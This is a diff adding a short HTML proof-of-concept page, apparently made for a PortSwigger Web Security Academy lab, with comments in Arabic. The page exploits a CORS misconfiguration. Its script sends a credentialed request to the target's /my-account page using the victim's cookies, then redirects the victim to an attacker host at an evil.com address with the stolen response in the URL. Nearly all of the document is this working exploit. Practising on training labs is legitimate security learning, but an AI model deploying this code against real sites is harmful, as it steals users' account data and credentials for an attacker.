@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit PoC</title>
+</head>
+<body>
+    <h2>CORS Exploit in Action...</h2>
+
+    <script>
+        // إعداد الطلب
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET', 'https://0a6f0032036aa41980813fab00cb0073.web-security-academy.net/my-account', true);
+        req.withCredentials = true; // هذا يجعل المتصفح يرسل الكوكيز الخاصة بالضحية
+        req.send();
+
+        // عند وصول الرد، يتم تحويل الضحية إلى /log مع البيانات المسروقة
+        function reqListener() {
+            // إرسال البيانات المسروقة إلى سيرفرك (مثلاً عبر عنوان URL)
+            location = 'https://attacker.ys7.com.evil.com/log?key=' + encodeURIComponent(this.responseText);
+        };
+    </script>
+
+</body>
+</html>
